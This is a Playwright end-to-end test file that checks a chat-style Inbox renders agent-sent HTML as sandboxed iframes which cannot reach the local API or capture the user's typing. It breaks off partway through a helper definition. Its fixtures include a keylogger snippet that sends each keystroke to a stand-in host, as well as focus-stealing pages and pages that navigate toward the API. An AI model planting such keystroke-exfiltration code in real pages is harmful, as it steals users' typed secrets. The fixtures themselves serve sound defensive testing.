/**
 * Live HTML in a message (approval "inbox-inline-html", 2026-10-28), proved
 * in a real browser against the compiled binary: `plannotator inbox
 * --background` under a temp PLANNOTATOR_DATA_DIR and HOME, an agent writing
 * through `plannotator inbox mcp` (scripts/inbox-sim.ts), the browser opening
 * the thread. No real network: the web the page loads from is stubbed with
 * `context.route`.
 *
 * What regresses if this fails:
 * - an agent's ```html fence no longer draws as a page (or ```mermaid stops
 *   drawing), or the page loses its sandbox;
 * - the page's requests reach the Inbox: any request from the embed's frame
 *   to either of the Inbox's loopback origins that leaves the browser, other
 *   than its own document (an absolute URL, a relative one, an image);
 * - the page can no longer load from the web over https (the owner's choice:
 *   "anything, like t3code's pages");
 * - the page takes the keyboard: the person's typing in the reply box reaches
 *   the page (which could send it over https), an Inbox shortcut is swallowed
 *   by a page that focused itself, or a page that keeps doing it is not
 *   stopped; hovering the page, a Tab that landed on the window, or a web
 *   frame inside the page lends it the keyboard (Chromium and WebKit);
 * - a page that grabs and then blocks the thread is not stopped with a notice,
 *   or one that grabs while the person types gets any key (the per-engine
 *   count for a grab before typing is logged);
 * - the shield is not a button a keyboard reaches, or pressing it does not
 *   give the page the keyboard;
 * - the window's shield stops the page working: the person's first click on
 *   a page button does nothing, hovering it does not reach it, typing into
 *   its input after clicking it fails, or the wheel over it no longer
 *   scrolls the thread;
 * - a window reached on another port (a forward) shows blank pages, or one
 *   reached at 127.0.0.1 does not run its pages;
 * - in Chromium a busy page freezes the window (the frame is no longer served
 *   from the other loopback name, so it shares the window's process);
 * - a page that navigates its frame to the Inbox gets an answer other than a
 *   refusal (it cannot read it either way: the frame is sandboxed);
 * - a link the page hands over opens without the window showing its real
 *   address and the person clicking Open;
 * - the page paints its own background or the window's theme does not reach
 *   it (it would not look embedded), or it does not size to its content;
 * - Code, Full screen or Escape stop working; on a phone the page spills
 *   past the column.
 *
 * Build the binary first (see inbox.spec.ts), then `bun run test:e2e:inbox`.
 */

import { chromium, expect, test, type Browser, type BrowserContext, type Frame, type Locator, type Page } from '@playwright/test';
import { spawnSync } from 'node:child_process';
import { existsSync, realpathSync } from 'node:fs';
import { connect, createServer, type AddressInfo } from 'node:net';
import { join, resolve } from 'node:path';
import { SimAgent, scratchProject } from '../../scripts/inbox-sim';
import { inboxScratch, removeInboxScratch } from './inbox-scratch';
import { NO_BROWSER } from '../helpers/no-browser';

const repo = resolve(__dirname, '../..');
const binary = resolve(process.env.PLANNOTATOR_E2E_BINARY ?? join(repo, '.local/plannotator'));

/** A stand-in for the web: never resolved, every request answered by `stubWeb`. */
const CDN = 'https://cdn.example.test';

/**
 * The agent's page: it loads a script and data from the web, then tries the
 * Inbox every way a page could, and writes what happened into itself.
 */
const PAGE = [
  '<style>p{margin:0 0 6px} #chart{height:160px;border-radius:6px;background:var(--chart-1)}</style>',
  `<script src="${CDN}/lib.js"></script>`,
  '<p id="lib">lib: pending</p><p id="cdn">cdn: pending</p><p id="inbox">inbox: pending</p><p id="relative">relative: pending</p><p id="img">img: pending</p>',
  '<div id="chart"></div>',
  `<p><a id="docs" href="${CDN}/docs">The docs</a></p>`,
  '<script>',
  "const say = (id, text) => { document.getElementById(id).textContent = id + ': ' + text; };",
  "say('lib', typeof window.LIB === 'string' ? window.LIB : 'missing');",
  `fetch('${CDN}/data.json').then((r) => r.json()).then((d) => say('cdn', d.ok ? 'ok' : 'bad'), () => say('cdn', 'blocked'));`,
  // The page's own address is on the Inbox (at its other loopback name): try it absolutely and relatively.
  "const inbox = new URL('/api/inbox/threads', location.href).href;",
  "fetch(inbox).then(() => say('inbox', 'reached'), () => say('inbox', 'blocked'));",
  "fetch('/api/inbox/health', { credentials: 'include' }).then(() => say('relative', 'reached'), () => say('relative', 'blocked'));",
  "const img = new Image(); img.onload = () => say('img', 'reached'); img.onerror = () => say('img', 'blocked'); img.src = '/api/inbox/health';",
  '</script>',
].join('\n');

/** A page that sends every key it gets to the web: what a thief would do with the keyboard. */
const keyLogger = (name: string) =>
  `document.addEventListener('keydown', (e) => { fetch('${CDN}/keys/${name}?k=' + encodeURIComponent(e.key)).catch(() => {}); });`;

/** Takes the keyboard every 30 ms, with no click. */
const THIEF = ['<input id="grab" aria-label="grab">', '<script>', keyLogger('thief'), "setInterval(() => { window.focus(); document.getElementById('grab').focus(); }, 30);", '</script>'].join('\n');

/** An innocent page with an autofocus input (Chromium refuses autofocus in another site's frame, so it focuses itself too). */
const AUTOFOCUS = ['<label>Filter <input id="q" autofocus></label>', '<script>', keyLogger('autofocus'), "document.getElementById('q').focus();", '</script>'].join('\n');

/** A page that takes the keyboard once every 2 seconds: alive long enough to race the person's typing. */
const SLOW_THIEF = ['<input id="grab" aria-label="grab">', '<script>', keyLogger('slow'), "setInterval(() => { document.getElementById('grab').focus(); }, 2000);", '</script>'].join('\n');

/** Grabs only while the pointer is over it, at most once per 5 s (the delta review's probe). */
const POINTER_THIEF = [
  '<div style="height:400px;background:#3a6">a chart</div><input id="grab" aria-label="grab">',
  '<script>',
  keyLogger('pointer'),
  "let inside = false, last = 0; document.addEventListener('mousemove', () => { inside = true; }); document.documentElement.addEventListener('mouseleave', () => { inside = false; });",
  "setInterval(() => { if (inside && !document.hasFocus() && Date.now() - last > 5000) { last = Date.now(); document.getElementById('grab').focus(); } }, 200);",
  '</script>',
].join('\n');

/** Grabs once, at a time it publishes: the test presses Tab just before. */
const TAB_THIEF = [
  '<input id="grab" aria-label="grab"><p id="at">at</p>',
  '<script>',
  keyLogger('tab'),
  "window.grabAt = Date.now() + 4000; document.getElementById('at').textContent = String(window.grabAt);",
  "setTimeout(() => { document.getElementById('grab').focus(); }, 4000);",
  '</script>',
].join('\n');

/** The page frames a web page that takes the keyboard every 300 ms. */
const NESTED = `<p id="n">nested</p><iframe id="inner" src="${CDN}/nested.html" style="width:300px;height:80px"></iframe>`;
const NESTED_DOC = ['<input id="q" autofocus>', '<script>', keyLogger('nested'), "setInterval(() => { window.focus(); document.getElementById('q').focus(); }, 300);", '</script>'].join('\n');

/** An ordinary interactive page: a button, an input, hover, and tall enough for the thread to scroll. */
const WIDGET = [
  '<button id="b">Count</button> <span id="n">0</span> <input id="t" aria-label="t"> <span id="hover">none</span>',
  '<div style="height:1600px"></div>',
  '<script>',
  keyLogger('widget'),
  "let n = 0; document.getElementById('b').addEventListener('click', () => { n += 1; document.getElementById('n').textContent = String(n); });",
  "document.addEventListener('mousemove', (e) => { document.getElementById('hover').textContent = e.target.id || e.target.tagName; });",
  '</script>',
].join('\n');

/** A page that only says it ran. */
const RAN = '<p id="ok">ok</p><script>document.getElementById("ok").textContent = "ran";</script>';

/**
 * Takes the keyboard once at a time it publishes, then blocks its thread for 2 s: where the frame
 * shares the window's thread (WebKit; Chromium without site isolation) the window's restore waits.
 */
const SPIN = [
  '<input id="grab" aria-label="grab"><p id="at">at</p>',
  '<script>',
  keyLogger('spin'),
  "window.grabAt = Date.now() + 5000; document.getElementById('at').textContent = String(window.grabAt);",
  "setTimeout(() => { document.getElementById('grab').focus(); const end = Date.now() + 2000; while (Date.now() < end) {} }, 5000);",
  '</script>',
].join('\n');

/** A page that steers its own frame at the Inbox. */
const WANDERER = "<p>leaving</p><script>setTimeout(() => { location.href = new URL('/api/inbox/threads?wander', location.href).href; }, 300);</script>";

/** A page that spins for five seconds. */
const BUSY = '<p id="busy">busy</p><script>setTimeout(() => { const end = Date.now() + 5000; while (Date.now() < end) {} }, 300);</script>';

async function stubWeb(context: BrowserContext): Promise<string[]> {
  const asked: string[] = [];
  await context.route(`${CDN}/**`, (route) => {
    const url = route.request().url();
    asked.push(url);
    if (url.endsWith('/lib.js')) return route.fulfill({ status: 200, contentType: 'text/javascript', body: 'window.LIB = "loaded";' });
    if (url.endsWith('/data.json')) return route.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: '{"ok":true}' });
    if (url.includes('/keys/')) return route.fulfill({ status: 204, headers: { 'access-control-allow-origin': '*' }, body: '' });
    if (url.endsWith('/nested.html')) return route.fulfill({ status: 200, contentType: 'text/html', body: NESTED_DOC });
    return route.fulfill({ status: 200, contentType: 'text/html', body: '<title>docs</title>docs' });
  });
  return asked;
}

const fence = (html: string) => ['```html', html, '```'].join('\n');

interface World {
  url: string;
  /** The window's origin (http://localhost:<port>) and the embeds' (http://127.0.0.1:<port>). */
  windowOrigin: string;
  embedOrigin: string;
  agent: SimAgent;
  project: string;
  close(): Promise<void>;
}

async function startWorld(prefix: string): Promise<World> {
  expect(existsSync(binary), `build the binary first: ${binary}`).toBe(true);
  const scratch = inboxScratch(prefix);
  const root = realpathSync(scratch);
  const env = {
    PATH: process.env.PATH ?? '',
    HOME: root,
    PLANNOTATOR_DATA_DIR: join(root, 'data'),
    PLANNOTATOR_BROWSER: NO_BROWSER,
    PLANNOTATOR_INBOX_CONNECT: '0',
    PLANNOTATOR_UPDATE_CHECK: '0',
  };
  try {
    const started = spawnSync(binary, ['inbox', '--background'], { env, encoding: 'utf8', timeout: 60_000 });
    expect(started.status, started.stderr).toBe(0);
    const url = started.stdout.trim();
    const windowOrigin = new URL(url).origin;
    expect(new URL(url).hostname).toBe('localhost');
    const embedOrigin = `http://127.0.0.1:${new URL(url).port}`;
    const project = scratchProject(join(root, 'src'), 'docs');
    const agent = await SimAgent.connect({ binary, env, name: 'Claude Code', host: 'claude-code' });
    return {
      url,
      windowOrigin,
      embedOrigin,
      agent,
      project,
      close: async () => {
        await agent.close().catch(() => {});
        await removeInboxScratch(scratch);
      },
    };
  } catch (error) {
    await removeInboxScratch(scratch);
    throw error;
  }
}

/** The embed's frame in `scope`, once its page has run (`ready`: an element the page writes). */
async function embedFrame(page: Page, scope = page.locator('body'), ready = '#img', pending = 'img: pending'): Promise<Frame> {
  const handle = await scope.locator('iframe[data-html-embed-frame="inline"]').first().elementHandle();
  const frame = (await handle!.contentFrame())!;
  await expect(frame.locator(ready)).not.toHaveText(pending);
  return frame;
}

/**
 * The person clicks a spot on the page. Until they do, the window's shield lies over it, so the
 * click lands on the shield at that spot (Playwright's own frame clicks would see it covered).
 */
async function clickInPage(page: Page, frame: Frame, selector: string): Promise<void> {
  const box = (await frame.locator(selector).boundingBox())!;
  await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
}

test('an html fence draws as a live, sandboxed page that loads from the web and never reaches the Inbox', async ({ browser, browserName }) => {
  // The network boundary is policy, the same in every engine; the request accounting below reads Chromium's reasons.
  test.skip(browserName !== 'chromium', 'Chromium: request failure reasons');
  const world = await startWorld('plannotator-inbox-inline-html-e2e-');
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
  const phone = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
  try {
    const web = await stubWeb(context);
    await stubWeb(phone);
    const sent = await world.agent.send({
      project_path: world.project,
      subject: 'Build time per deploy',
      body: ['The index adds 40 seconds to each build:', '', fence(PAGE), '', '```mermaid', 'flowchart LR', '  A --> B', '```'].join('\n'),
    });
    const page = await context.newPage();
    // Every request the page's frame sent to the Inbox (at either loopback name). Chromium reports a
    // load its policy stopped (reason `csp`) as a request that failed; that one never left the browser.
    const toInbox: string[] = [];
    const stoppedByPolicy: string[] = [];
    const inboxOrigins = [world.windowOrigin, world.embedOrigin];
    const fromFrame = (request: { frame(): Frame; url(): string }) =>
      request.frame() !== page.mainFrame() && inboxOrigins.some((origin) => request.url().startsWith(origin));
    page.on('request', (request) => {
      if (fromFrame(request)) toInbox.push(request.url());
    });
    page.on('requestfailed', (request) => {
      if (fromFrame(request) && request.failure()?.errorText === 'csp') stoppedByPolicy.push(request.url());
    });
    await page.goto(`${world.url}#thread=${sent.thread_id}`);
    const message = page.locator(`[data-message-id="${sent.message_id as string}"]`);

    // Diagrams still draw (Stage 0: agents are now told).
    await expect(message.locator('[data-block-id] svg').first()).toBeVisible();

    const iframe = message.locator('iframe[data-html-embed-frame="inline"]');
    await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts');
    const frame = await embedFrame(page, message);
    const documentUrl = frame.url();
    // Served from the other loopback name: another site, so its own process in Chromium.
    expect(documentUrl.startsWith(`${world.embedOrigin}/api/inbox/embeds/`)).toBe(true);

    // The web over https: allowed.
    await expect(frame.locator('#lib')).toHaveText('lib: loaded');
    await expect(frame.locator('#cdn')).toHaveText('cdn: ok');
    expect(web.some((asked) => asked.endsWith('/data.json'))).toBe(true);
    // The Inbox: never, however the page asks.
    await expect(frame.locator('#inbox')).toHaveText('inbox: blocked');
    await expect(frame.locator('#relative')).toHaveText('relative: blocked');
    await expect(frame.locator('#img')).toHaveText('img: blocked');
    const leftTheBrowser = toInbox.filter((asked) => !stoppedByPolicy.includes(asked));
    expect(leftTheBrowser.map((asked) => asked.split('#')[0])).toEqual([documentUrl.split('#')[0]]);
    // An opaque origin.
    expect(await frame.evaluate(() => self.origin)).toBe('null');

    // It looks embedded: no background of its own, the window's theme and color-scheme, sized to its content.
    const look = await frame.evaluate(() => ({
      background: getComputedStyle(document.body).backgroundColor,
      htmlBackground: getComputedStyle(document.documentElement).backgroundColor,
      foreground: getComputedStyle(document.documentElement).getPropertyValue('--foreground').trim(),
      scheme: document.documentElement.style.colorScheme,
      height: Math.ceil(document.documentElement.getBoundingClientRect().height),
    }));
    expect(look.background).toBe('rgba(0, 0, 0, 0)');
    expect(look.htmlBackground).toBe('rgba(0, 0, 0, 0)');
    const windowForeground = await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--foreground').trim());
    expect(look.foreground).toBe(windowForeground);
    expect(await iframe.evaluate((el: HTMLIFrameElement) => el.style.colorScheme)).toBe(look.scheme);
    await expect.poll(() => iframe.evaluate((el: HTMLIFrameElement) => el.getBoundingClientRect().height)).toBe(look.height);

    // A link the person clicks: the window shows its real address; it opens on the person's Open.
    const embed = message.locator('[data-html-embed]');
    await clickInPage(page, frame, '#docs');
    await expect(embed.locator('[data-html-embed-link-url]')).toHaveText(`${CDN}/docs`);
    expect(context.pages()).toHaveLength(1);
    const opened = context.waitForEvent('page');
    await embed.locator('[data-html-embed-link-open]').click();
    expect((await opened).url()).toBe(`${CDN}/docs`);
    await expect(embed.locator('[data-html-embed-link]')).toHaveCount(0);

    // Code shows the source; again, the page.
    await embed.locator('[data-html-embed-code]').click();
    await expect(iframe).toHaveCount(0);
    await expect(embed).toContainText('cdn.example.test/lib.js');
    await embed.locator('[data-html-embed-code]').click();
    await expect(iframe).toHaveCount(1);

    // Full screen: the same page, large; Escape closes it and the thread stays open.
    await embed.locator('[data-html-embed-full]').click();
    const popout = page.locator('[data-html-embed-popout]');
    await expect(popout.locator('iframe[data-html-embed-frame="full"]')).toHaveAttribute('sandbox', 'allow-scripts');
    await page.keyboard.press('Escape');
    await expect(popout).toHaveCount(0);
    await expect(message).toBeVisible();

    // A phone: the page fits the column.
    const small = await phone.newPage();
    await small.goto(`${world.url}#thread=${sent.thread_id}`);
    const smallFrame = small.locator('iframe[data-html-embed-frame="inline"]');
    await expect(smallFrame).toHaveAttribute('sandbox', 'allow-scripts');
    await embedFrame(small);
    const box = await smallFrame.boundingBox();
    expect(box!.x).toBeGreaterThanOrEqual(0);
    expect(box!.x + box!.width).toBeLessThanOrEqual(390);
  } finally {
    await context.close().catch(() => {});
    await phone.close().catch(() => {});
    await world.close();
  }
});

/** Open a thread whose message holds `html`, with the web stubbed. */
async function openThread(browser: Browser, world: World, subject: string, html: string, base = world.url, after: string[] = []) {
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
  const web = await stubWeb(context);
  // Its own thread (a session's messages otherwise join its open thread, and a reply draft with it).
  const sent = await world.agent.send({ project_path: world.project, thread: subject, subject, body: ['A page:', '', fence(html), ...after].join('\n') });
  const page = await context.newPage();
  await page.goto(`${base}#thread=${sent.thread_id}`);
  const message = page.locator(`[data-message-id="${sent.message_id as string}"]`);
  return { context, web, page, message, keysAt: (name: string) => web.filter((asked) => asked.includes(`/keys/${name}`)) };
}

const replyBox = (page: Page) => page.getByRole('textbox', { name: /^Reply to/ });
async function openReply(page: Page) {
  const reply = page.locator('section.ib-pane .ib-pfoot').getByRole('button', { name: 'Reply', exact: true });
  // The foot shows Reply, or the box itself when it is open already.
  await expect(reply.or(replyBox(page))).toBeVisible();
  if (await reply.isVisible()) await reply.click();
  await expect(replyBox(page)).toBeVisible();
}

test('a page that takes the keyboard never gets the person’s typing, and one that keeps taking it is stopped', async ({ browser, browserName }) => {
  // WebKit lets another site's frame take focus only in some states (here it never got it once the
  // person was in the window), so a grab, and the stop it leads to, is certain in Chromium only.
  // Both engines must keep every key in the reply box.
  const grabsCertain = browserName === 'chromium';
  const world = await startWorld('plannotator-inbox-inline-html-focus-e2e-');
  try {
    // Every 30 ms, from the moment it loads: each grab is taken back, then the page is stopped.
    const thief = await openThread(browser, world, 'A page that grabs', THIEF);
    try {
      await expect(thief.message.locator('iframe[data-html-embed-frame="inline"], [data-html-embed-grabbed]').first()).toBeVisible();
      await openReply(thief.page);
      await replyBox(thief.page).click();
      await thief.page.keyboard.type('secret words', { delay: 40 });
      await expect(replyBox(thief.page)).toHaveValue('secret words');
      expect(thief.keysAt('thief')).toEqual([]);
      if (grabsCertain) {
        await expect(thief.message.locator('[data-html-embed-grabbed]')).toContainText('so it was stopped');
        await expect(thief.message.locator('iframe[data-html-embed-frame]')).toHaveCount(0);
      }
    } finally {
      await thief.context.close().catch(() => {});
    }

    // Every 2 s: alive while the person types; each grab is taken back before a key lands.
    const slow = await openThread(browser, world, 'A page that grabs now and then', SLOW_THIEF);
    try {
      await expect(slow.message.locator('iframe[data-html-embed-frame="inline"]')).toHaveCount(1);
      await openReply(slow.page);
      await replyBox(slow.page).click();
      await slow.page.keyboard.type('secret words, typed slowly across a grab', { delay: 120 });
      await expect(replyBox(slow.page)).toHaveValue('secret words, typed slowly across a grab');
      expect(slow.keysAt('slow')).toEqual([]);
      if (grabsCertain) await expect(slow.page.locator('[data-html-embed-grabbed]')).toHaveCount(1);
    } finally {
      await slow.context.close().catch(() => {});
    }

    // An innocent autofocus input: focus comes back to the window at once, so an Inbox shortcut works.
    const quiet = await openThread(browser, world, 'A page with a filter box', AUTOFOCUS);
    try {
      await expect(quiet.message.locator('iframe[data-html-embed-frame="inline"]')).toHaveCount(1);
      await embedFrame(quiet.page, quiet.message, '#q', 'never');
      await expect.poll(() => quiet.page.evaluate(() => document.activeElement?.tagName)).not.toBe('IFRAME');
      await quiet.page.keyboard.press('ControlOrMeta+K');
      await expect(quiet.page.locator('dialog[data-search-palette]')).toBeVisible();
      await quiet.page.keyboard.press('Escape');
      // One grab is not a page that keeps grabbing: it stays.
      await expect(quiet.message.locator('iframe[data-html-embed-frame="inline"]')).toHaveCount(1);
      expect(quiet.keysAt('autofocus')).toEqual([]);
      // The person clicks into it (not mid-typing): theirs to type in.
      await quiet.page.waitForTimeout(800);
      const frame = await embedFrame(quiet.page, quiet.message, '#q', 'never');
      await clickInPage(quiet.page, frame, '#q');
      // The click reaches the page by message: its input has focus a moment later.
      await expect.poll(() => frame.evaluate(() => document.activeElement?.id)).toBe('q');
      await quiet.page.keyboard.type('ab');
      await expect(frame.locator('#q')).toHaveValue('ab');
    } finally {
      await quiet.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

test('hovering a page, a Tab that lands on the window, or a web frame inside the page never lends it the keyboard', async ({ browser }) => {
  const world = await startWorld('plannotator-inbox-inline-html-lend-e2e-');
  try {
    // The person rests the pointer on the chart while composing: the page sees the hover, never the keys.
    const pointer = await openThread(browser, world, 'A page that grabs on hover', POINTER_THIEF);
    try {
      const iframe = pointer.message.locator('iframe[data-html-embed-frame="inline"]');
      await expect(iframe).toHaveCount(1);
      await openReply(pointer.page);
      await replyBox(pointer.page).click();
      await pointer.page.keyboard.type('abc', { delay: 40 });
      const box = (await iframe.boundingBox())!;
      await pointer.page.mouse.move(box.x + box.width / 2, box.y + 100, { steps: 5 });
      await pointer.page.waitForTimeout(6000);
      await pointer.page.mouse.move(box.x + box.width / 2 + 10, box.y + 110, { steps: 3 });
      await pointer.page.waitForTimeout(1500);
      await pointer.page.keyboard.type('secret', { delay: 60 });
      await expect(replyBox(pointer.page)).toHaveValue('abcsecret');
      expect(pointer.keysAt('pointer')).toEqual([]);
    } finally {
      await pointer.context.close().catch(() => {});
    }

    // A Tab out of the reply box lands on a window element: a grab just after it is taken back.
    const tab = await openThread(browser, world, 'A page that grabs after a Tab', TAB_THIEF);
    try {
      const frame = await embedFrame(tab.page, tab.message, '#at', 'at');
      const grabAt = await frame.evaluate(() => (window as unknown as { grabAt: number }).grabAt);
      await openReply(tab.page);
      await replyBox(tab.page).click();
      await tab.page.keyboard.type('abc', { delay: 40 });
      const wait = grabAt - (await frame.evaluate(() => Date.now())) - 400;
      if (wait > 0) await tab.page.waitForTimeout(wait);
      await tab.page.keyboard.press('Tab');
      await tab.page.waitForTimeout(1000);
      await tab.page.keyboard.type('xyz', { delay: 60 });
      await tab.page.waitForTimeout(500);
      expect(tab.keysAt('tab')).toEqual([]);
      expect(await tab.page.evaluate(() => document.activeElement?.tagName)).not.toBe('IFRAME');
    } finally {
      await tab.context.close().catch(() => {});
    }

    // A web page framed inside the embed grabs every 300 ms: still the window's keyboard.
    const nested = await openThread(browser, world, 'A page that frames a grabber', NESTED);
    try {
      await expect(nested.message.locator('iframe[data-html-embed-frame="inline"], [data-html-embed-grabbed]').first()).toBeVisible();
      await openReply(nested.page);
      await replyBox(nested.page).click();
      await nested.page.keyboard.type('secret words typed slowly', { delay: 120 });
      await expect(replyBox(nested.page)).toHaveValue('secret words typed slowly');
      expect(nested.keysAt('nested')).toEqual([]);
    } finally {
      await nested.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

test('the page works through the shield: hover reaches it, the first click works, its input takes typing, the wheel scrolls the thread', async ({ browser }) => {
  const world = await startWorld('plannotator-inbox-inline-html-shield-e2e-');
  try {
    // Enough text after the page for the thread to scroll.
    const filler = Array.from({ length: 40 }, (_, i) => ['', `Paragraph ${i + 1} of the notes after the page.`]).flat();
    const opened = await openThread(browser, world, 'An interactive page', WIDGET, world.url, filler);
    try {
      const { page, message } = opened;
      const iframe = message.locator('iframe[data-html-embed-frame="inline"]');
      const frame = await embedFrame(page, message, '#n', 'never');
      await expect(message.locator('[data-html-embed-shield]')).toHaveCount(1);

      // Hover reaches the page without a click, and lends it nothing.
      const button = (await frame.locator('#b').boundingBox())!;
      await page.mouse.move(button.x + button.width / 2, button.y + button.height / 2, { steps: 3 });
      await expect(frame.locator('#hover')).toHaveText('b');
      expect(await page.evaluate(() => document.activeElement?.tagName)).not.toBe('IFRAME');

      // The person's first click on the page's button works, with nothing in between.
      await clickInPage(page, frame, '#b');
      await expect(frame.locator('#n')).toHaveText('1');
      await expect(message.locator('[data-html-embed-shield]')).toHaveCount(0);
      // Theirs now: clicking its input and typing.
      await frame.locator('#t').click();
      await page.keyboard.type('hi');
      await expect(frame.locator('#t')).toHaveValue('hi');

      // Back in the window: the shield returns and the keys are the window's.
      await openReply(page);
      await replyBox(page).click();
      await expect(message.locator('[data-html-embed-shield]')).toHaveCount(1);
      await page.keyboard.type('mine');
      await expect(replyBox(page)).toHaveValue('mine');
      expect(opened.keysAt('widget').map((asked) => decodeURIComponent(asked.split('k=')[1] ?? ''))).toEqual(['h', 'i']);

      // The wheel over the page scrolls the thread.
      const scroller = await iframe.evaluateHandle((el) => {
        let node: HTMLElement | null = el.parentElement;
        while (node && !(node.scrollHeight > node.clientHeight && /(auto|scroll)/.test(getComputedStyle(node).overflowY))) node = node.parentElement;
        return node!;
      });
      const before = await scroller.evaluate((el) => (el as HTMLElement).scrollTop);
      const box = (await iframe.boundingBox())!;
      const point = { x: box.x + box.width / 2, y: Math.max(box.y, 0) + 100 };
      await page.mouse.move(point.x, point.y);
      expect(await page.evaluate(({ x, y }) => document.elementFromPoint(x, y)?.hasAttribute('data-html-embed-shield'), point)).toBe(true);
      await page.mouse.wheel(0, 400);
      await expect.poll(() => scroller.evaluate((el) => (el as HTMLElement).scrollTop)).toBeGreaterThan(before + 100);
    } finally {
      await opened.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

test('a keyboard or screen reader reaches the shield as a button, "Use this page", and pressing it gives the page the keyboard', async ({ browser }) => {
  const world = await startWorld('plannotator-inbox-inline-html-door-e2e-');
  try {
    const ECHO = ['<p id="got">got:</p>', '<script>', "document.addEventListener('keydown', (e) => { document.getElementById('got').textContent += e.key; });", '</script>'].join('\n');
    const opened = await openThread(browser, world, 'A page for the keyboard', ECHO);
    try {
      const frame = await embedFrame(opened.page, opened.message, '#got', 'never');
      const door = opened.message.getByRole('button', { name: 'Use this page' });
      await expect(door).toHaveCount(1);
      await door.focus();
      await opened.page.keyboard.press('Enter');
      await expect.poll(() => opened.page.evaluate(() => document.activeElement?.tagName)).toBe('IFRAME');
      await opened.page.keyboard.type('ok');
      await expect(frame.locator('#got')).toHaveText('got:ok');
      await expect(opened.message.locator('[data-html-embed-grabbed]')).toHaveCount(0);
    } finally {
      await opened.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

test('a window reached on another port, or at 127.0.0.1, runs its pages', async ({ browser }) => {
  const world = await startWorld('plannotator-inbox-inline-html-port-e2e-');
  const inboxPort = Number(new URL(world.url).port);
  // A plain TCP forward (an ssh -L, a dev proxy): the browser sees another port.
  const forward = createServer((client) => {
    const upstream = connect(inboxPort, '127.0.0.1');
    client.pipe(upstream);
    upstream.pipe(client);
    client.on('error', () => upstream.destroy());
    upstream.on('error', () => client.destroy());
  });
  await new Promise<void>((done) => forward.listen(0, '127.0.0.1', () => done()));
  const forwardPort = (forward.address() as AddressInfo).port;
  try {
    for (const base of [`http://localhost:${forwardPort}/`, `http://127.0.0.1:${inboxPort}/`]) {
      const opened = await openThread(browser, world, `Through ${base}`, RAN, base);
      try {
        const frame = await embedFrame(opened.page, opened.message, '#ok', 'ok');
        await expect(frame.locator('#ok')).toHaveText('ran');
        await expect(opened.message.locator('[data-html-embed]')).toHaveAttribute('data-html-embed-phase', 'ready');
        expect(await frame.evaluate(() => self.origin)).toBe('null');
      } finally {
        await opened.context.close().catch(() => {});
      }
    }
  } finally {
    forward.close();
    await world.close();
  }
});

/** The stop notice says how many keys reached the page, and nothing about keys when none did. */
async function expectHonestNotice(scope: Locator, reached: number): Promise<void> {
  const notice = scope.locator('[data-html-embed-grabbed]');
  if (reached === 0) await expect(notice).not.toContainText('you typed');
  else await expect(notice).toContainText(reached === 1 ? 'It got 1 key you typed.' : `It got ${reached} keys you typed.`);
}

/**
 * Keys sent the way an OS queues them while the window is blocked: none awaited on its own
 * (CDP in Chromium; parallel presses in WebKit).
 */
async function queueKeys(page: Page, browserName: string, word: string): Promise<void> {
  if (browserName === 'chromium') {
    const cdp = await page.context().newCDPSession(page);
    await Promise.all(
      [...word].map((ch) =>
        Promise.all([cdp.send('Input.dispatchKeyEvent', { type: 'keyDown', key: ch, text: ch }), cdp.send('Input.dispatchKeyEvent', { type: 'keyUp', key: ch })]),
      ),
    );
  } else {
    await Promise.all([...word].map((ch) => page.keyboard.press(ch)));
  }
}

test('a page that takes the keyboard and then blocks the thread is stopped and the person told; while they type, it gets nothing', async ({ browser, browserName }) => {
  const world = await startWorld('plannotator-inbox-inline-html-spin-e2e-');
  const stolenKeys = (t: { keysAt: (name: string) => string[] }) => t.keysAt('spin').map((asked) => decodeURIComponent(asked.split('k=')[1] ?? '')).join('');
  try {
    // The person is not typing when it grabs, then types during the block. Where the frame shares
    // the window's thread the restore runs late: the page is stopped and the notice says so. The
    // keys typed during the block may have reached it (counted below, not asserted): bounded, once.
    const idle = await openThread(browser, world, 'A page that grabs then spins', SPIN);
    try {
      const frame = await embedFrame(idle.page, idle.message, '#at', 'at');
      const grabAt = await frame.evaluate(() => (window as unknown as { grabAt: number }).grabAt);
      await openReply(idle.page);
      await replyBox(idle.page).click();
      await idle.page.waitForTimeout(grabAt - (await frame.evaluate(() => Date.now())) + 300);
      await queueKeys(idle.page, browserName, 'password');
      await expect(idle.message.locator('[data-html-embed-stopped]')).toHaveAttribute('data-html-embed-stopped', /^(late|keys)$/);
      await idle.page.waitForTimeout(500);
      // The notice counts what reached the page (its bootstrap reports each key, never which).
      await expectHonestNotice(idle.message, stolenKeys(idle).length);
      console.log(`[${browserName}] grab, then a 2 s block, keys queued during it: reply "${await replyBox(idle.page).inputValue()}", page got "${stolenKeys(idle)}"`);
    } finally {
      await idle.context.close().catch(() => {});
    }

    // The person is typing when it grabs: the page is gone in that same task, so not one key reaches it.
    const typing = await openThread(browser, world, 'A page that grabs mid-reply then spins', SPIN);
    try {
      const frame = await embedFrame(typing.page, typing.message, '#at', 'at');
      const grabAt = await frame.evaluate(() => (window as unknown as { grabAt: number }).grabAt);
      await openReply(typing.page);
      await replyBox(typing.page).click();
      await typing.page.waitForTimeout(grabAt - (await frame.evaluate(() => Date.now())) - 900);
      await typing.page.keyboard.type('my ', { delay: 100 });
      await typing.page.waitForTimeout(grabAt - (await typing.page.evaluate(() => Date.now())) + 300);
      await queueKeys(typing.page, browserName, 'password');
      await expect(typing.message.locator('[data-html-embed-stopped]')).toHaveAttribute('data-html-embed-stopped', 'typing');
      await expect(typing.message.locator('[data-html-embed-grabbed]')).toContainText('took the keyboard while you were typing');
      await typing.page.waitForTimeout(2500);
      expect(stolenKeys(typing)).toBe('');
      console.log(`[${browserName}] grab mid-reply, then a 2 s block: reply "${await replyBox(typing.page).inputValue()}", page got "${stolenKeys(typing)}"`);
    } finally {
      await typing.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

/** Grabs at `times` (ms after load), blocking its thread `block` ms each time. */
const blockingGrabber = (name: string, times: number[], block: number) =>
  [
